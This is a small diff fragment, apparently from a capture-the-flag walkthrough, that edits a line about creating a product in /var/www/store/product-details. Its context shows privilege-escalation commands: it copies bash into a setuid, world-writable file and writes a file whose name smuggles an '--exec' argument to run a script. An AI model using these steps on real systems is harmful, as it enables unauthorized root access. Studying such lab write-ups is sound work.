@@ -319,7 +319,7 @@ cp /bin/bash /tmp/0xdf
 chmod 4777 /tmp/0xdf
 ```
 
-Creating product.
+Creating product inside /var/www/store/product-details.
 ```
 echo '0xdf --exec="!/dev/shm/0xdf.sh"' >> 223.txt
 ```
